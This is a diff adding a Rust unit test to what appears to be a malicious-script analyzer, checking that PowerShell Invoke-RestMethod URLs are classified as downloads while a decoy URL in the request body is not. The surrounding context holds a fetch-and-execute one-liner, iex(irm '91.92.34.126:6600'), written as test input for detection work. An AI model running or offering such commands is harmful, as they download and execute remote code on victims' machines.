@@ -8179,6 +8179,31 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn irm_body_hash_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-RestMethod -Uri https://ps-body-hash-actual.example/api -Method Post -Body @{next="https://ps-body-hash-decoy.example/payload.exe"}"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-body-hash-actual.example/api"
+                )
+            }),
+            "actual IRM URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-body-hash-decoy.example/payload.exe"
+                )
+            }),
+            "IRM body hash URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn irm_schemeless_ip_url_extracted_as_download() {
         let ps = r#"iex(irm '91.92.34.126:6600' -UseBasicParsing)"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
